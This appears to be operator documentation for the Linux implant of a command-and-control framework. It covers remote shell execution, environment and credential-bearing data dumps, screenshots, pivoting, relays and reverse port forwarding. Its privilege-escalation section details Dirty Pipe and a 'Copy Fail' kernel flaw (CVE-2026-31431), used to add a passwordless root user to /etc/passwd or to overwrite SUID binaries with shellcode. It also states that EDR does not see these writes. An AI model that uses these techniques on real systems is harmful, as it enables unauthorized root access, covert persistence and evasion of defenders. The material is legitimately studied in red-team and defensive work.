Linux Beacon Commands

The Linux beacon supports all common commands (filesystem, shell, sleep, exit, screenshot, download, upload) plus a set of Linux-specific commands. Common commands are described in the main reference.

The Linux beacon is built as an ELF binary (beacon-linux64) and a shared library (beacon-linux64.so). The library variant is loaded via LD_PRELOAD or dlopen — the beacon starts in a separate thread when the .so is loaded.

Filesystem

CommandArgumentsDescription
cat<path> Print file contents. Chunked transfer for large files.
mkdir<path> Create a directory (mkdir(path, 0755)).
chmod<mode> <path> Change file permissions. Mode is specified as an octal number (e.g. chmod 755 /tmp/payload).

Execution and Processes

CommandArgumentsDescription
shell<cmd> Execute a command via fork() + execl("/bin/sh", "sh", "-c", cmd). Stdout and stderr are captured via pipe().
ps Process list: reads /proc/[pid]/stat, /proc/[pid]/status, and /proc/[pid]/cmdline. Format: PID|PPID|UID|USER|CMD.
kill<pid> Terminate a process with SIGKILL.

System Information

CommandArgumentsDescription
whoami Current user (getpwuid(getuid())).
id UID, GID, EUID, EGID, and the list of supplementary groups.
hostname Hostname (gethostname()).
env Process environment variables (full environ dump). Data is transferred in chunks for large output.
ifconfig List of network interfaces and IP addresses (IPv4/IPv6) via getifaddrs().

Screenshot

CommandArgumentsDescription
screenshot Capture the screen as a 24-bit BMP. The file is saved on the operator's desktop: screenshot_<beaconId>_<timestamp>.bmp.

Two capture methods (in priority order):

  1. X11 — loads libX11.so.6 via dlopen() (no compile-time dependency). Captures the root window (XGetImage on root window). Supports 32/24/16-bit color. Works on systems with an X server.
  2. Framebuffer — reads /dev/fb0 via mmap(). Works on TTY, embedded systems, and servers without a graphical environment. Requires read access to /dev/fb0.
If neither X11 nor framebuffer is available, the command returns an error: screenshot: no X11 display and /dev/fb0 unavailable.

Privilege Escalation

CommandArgumentsDescription
privesc_root[method] Escalate privileges to root via kernel vulnerabilities.

Two vulnerability families are supported:

  • Dirty Pipe (CVE-2022-0847) — page cache overwrite via pipe buffer flag. Kernels 5.8–5.16.10.
  • Copy Fail (CVE-2026-31431) — scratch-write into page cache via the authencesn template of AF_ALG. Kernels 4.14–6.19.12.

Methods

MethodSyntaxCVEDescription
passwdprivesc_root passwd 2022-0847 Overwrite /etc/passwd: adds user r00t (uid=0, empty password). Dirty Pipe.
suidprivesc_root suid <path> 2022-0847 Overwrite a SUID binary: writes an ELF shellcode (setuid(0)+execve("/bin/sh")). Dirty Pipe.
afalgprivesc_root afalg <path> 2022-0847 AF_ALG variant of Dirty Pipe: uses an algif_aead socket instead of a regular pipe. Bypasses some patches.
copyfailprivesc_root copyfail <path> 2026-31431 Overwrite a SUID binary via Copy Fail: scratch-write from the authencesn module writes 4 bytes per operation into page cache. Deterministic write (no race condition).
copyfail_passwdprivesc_root copyfail_passwd 2026-31431 Overwrite /etc/passwd via Copy Fail. Equivalent to the passwd method but for kernels 4.14–6.19.

CVE-2026-31431 — Copy Fail

A logic error in the authencesn (Extended Sequence Number) template of the algif_aead module. During decryption the kernel writes 4 bytes from the IV at position assoclen-8 in the source scatterlist. If the data pages were obtained via splice() from a file, the write goes directly into the page cache.

Mechanism:

  1. socket(AF_ALG) → bind to authencesn(hmac(sha256),cbc(aes))
  2. setsockopt: key (authencesn format) + authsize=32
  3. accept() → operation fd
  4. sendmsg() with cmsg: op=decrypt, IV[0..3]=payload, assoclen=offset+12
  5. splice() pages of the target file into the operation fd (zero-copy)
  6. recv() → kernel calls crypto_authenc_esn_decrypt() → writes IV[0..3] to src[assoclen-8] = file page cache

Advantages over Dirty Pipe:

  • Works on kernels 4.14+ (Dirty Pipe: only 5.8–5.16.10)
  • Can write at offset 0 (Dirty Pipe: minimum 1)
  • Deterministic: no race with pipe buffer flags

Limitations:

  • 4 bytes per operation (Dirty Pipe: up to PAGE_SIZE)
  • Requires the algif_aead + authencesn module in the kernel
  • Target file must be ≥ 256 bytes (for splice)

Both methods write to the kernel page cache — user-space antivirus and EDR solutions do not intercept the write. However, file integrity systems (AIDE, dm-verity) may detect changes. Copy Fail leaves traces in the form of many AF_ALG sockets in audit logs (if audit is enabled).
Kernel version: check the version before use with shell uname -r. Copy Fail additionally checks for the availability of the authencesn module — if the module is not loaded it returns an error.

Interactive Shell (ishell)

CommandArgumentsDescription
ishell<text> Send a line to the STDIN of a running /bin/sh. If the shell has not been created yet — it is started automatically (fork() + execl("/bin/sh"), I/O via socketpair(AF_UNIX)).
ishell(empty) Close the interactive shell: close the socket, wait for the child process to exit.

Unlike shell, which creates a new process for each command, ishell keeps a single /bin/sh between calls. This allows running long-running commands (linpeas, tcpdump, etc.) and receiving output in parts: the beacon's main loop calls ishell_pump() on each iteration and sends accumulated stdout/stderr.

The operator console switches to [interactive shell] mode. Each entered line is an ishell <text> call. The exit command inside this mode closes /bin/sh without stopping the beacon.

Pivot and Relay

CommandArgumentsDescription
tcp_pivot<host> <port> Open a raw TCP channel to a pivot listener on the teamserver. The beacon creates a TCP connection to host:port and multiplexes traffic through this channel. Allows a beacon in an isolated network segment to reach the teamserver through an intermediary beacon.

Relay (chain pivot)

The Linux beacon supports the relay mechanism — a parent beacon opens a TCP port to which child beacons connect. All child beacon traffic is relayed through the parent to the teamserver.

CommandArgumentsDescription
relay_start<port> Open a TCP listener on the specified port. Each accepted connection is a child beacon. Maximum 8 simultaneous child sessions.
relay_stop Close the relay listener and all child connections.

Relay frames from child beacons are sent with the magic task_id = 0xFFFFFFFFFFFFFFFD, which the teamserver routes separately from regular responses. The operator sees child beacons as independent sessions in the Sessions table.

Relay commands are invoked from the Sessions/Graph context menu: Start relay port (chain pivot)… and Generate relay child beacon…. Manual console input is not needed.

Reverse Port Forward

The teamserver opens a TCP port (bind); on incoming connections traffic goes through the C2 channel to the beacon, which forwards it to rhost:rport. Architecturally — the mirror of SOCKS5: the client connects to the teamserver, not to the operator's proxy client. Maximum 16 simultaneous connections.

How to createDescription
Sessions → right-click → Start Reverse Port Forward… Dialog: Bind host and Bind port — what the teamserver opens; Rhost and Rport — the target the beacon connects to. After clicking OK the teamserver starts listening. On the first incoming connection the beacon establishes a connection to rhost:rport.

Traffic flow:

external client → teamserver:bind_port → (C2 channel) → beacon → rhost:rport

Protocol: data is transferred via out-of-band frames with the magic task_id = 0xFFFFFFFFFFFFFFFC (RPORTFWD_TASK_MAGIC). Frame format: [u64 conn_id BE][u8 type][payload], where type:

  • 0x01 — CONNECT_OK (beacon successfully connected to rhost:rport)
  • 0x02 — CONNECT_FAIL (connection error)
  • 0x03 — DATA: [u32 len BE][bytes]
  • 0x04 — CLOSE (connection closed)
Example — access to an internal web server through the teamserver:
Bind host: 0.0.0.0, Bind port: 8080, Rhost: internal-webapp.corp.local, Rport: 80
curl http://teamserver-ip:8080/

Difference from SOCKS5: SOCKS5 tunnels arbitrary traffic through the polling loop; rportfwd opens a specific port directly on the teamserver, requires no SOCKS5 client, and works for any TCP protocol.
